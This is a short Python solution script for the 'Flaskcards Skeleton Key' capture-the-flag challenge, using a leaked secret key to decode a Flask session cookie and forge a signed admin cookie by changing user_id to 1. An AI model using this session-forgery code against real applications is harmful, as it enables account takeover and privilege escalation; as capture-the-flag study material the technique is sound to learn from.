# Flaskcards Skeleton Key solution
# by Sudoite

import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

# From https://gist.github.com/babldev/502364a3f7c9bafaa6db
def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)

#https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe
def encode_flask_cookie(secret_key, cookie_dict):
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    signing_serializer = URLSafeTimedSerializer(secret_key,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer_kwargs=signer_kwargs)
    return signing_serializer.dumps(cookie_dict)

secret_key = "a155eb4e1743baef085ff6ecfed943f2"
print(decode_flask_cookie(secret_key, ".eJwtjztuAzEMRO-i2oUo_n2ZBaUlEcNAAuzaVZC7e4u0M3iDN79tqyPPr3Z_He-8te2xt3sbirtayGLgBRE2g0XKc1HHSQri2kNYjaaNULHeGc2pnHvhogGpya5EEIpJ1hfHlc2RxWS5KgyK9CojR8BkyUBj6YGCq93aOo_aXj_P_L58JhvvBioyAwqvQZYYGJ5eEb68BkDXeXHvM4__E97-PizGPhM.D_alNQ.ctZ9nwlOeZhv-APxuvB97Fo8qmI"))
# {u'csrf_token': u'b585d81766ba1f33e456a23a9e9faa9c9f21107b', u'_fresh': True, u'user_id': u'29', u'_id': u'273d78a6c515c1aa8ba566f9ec403b4716970a65784b82a7680053894f950f3c421e7e597441a73e480c5a1e7b2ef548ecfa81f47a73ae2a1b56ea38560a363c'}
# I've learned that different users use the same csrf token. How can I use that?

# Now I'll try forging a cookie as user 1. 
admin_cookie_dict = {u'csrf_token': u'b585d81766ba1f33e456a23a9e9faa9c9f21107b', u'_fresh': True, u'user_id': u'1', u'_id': u'273d78a6c515c1aa8ba566f9ec403b4716970a65784b82a7680053894f950f3c421e7e597441a73e480c5a1e7b2ef548ecfa81f47a73ae2a1b56ea38560a363c'}

admin_cookie = encode_flask_cookie(secret_key, admin_cookie_dict)
print("admin cookie is " + admin_cookie)
#.eJwlj8uqAjEQRP8laxfp9DP-zNDJdKMICjO6utx_N-C2ilOc-itbHnHeyvV9fOJStvterqUp7mouk4EnuNtwFskekyoOUpCu1YXVaFhzFauV0Tpl55o4qUFocFcicMUgq5N9ZaNFMlnMdIMkXaVHcxgs4Wgs1VFwlkuZ55Hb-_WI5_IZbLwbqMhwSFyDLN7Qe_R077NnA6g6Fvc54_idgPL_Be7OPdk.D_athQ.asxXRIRFOOmxgYngmC-sgeFPac0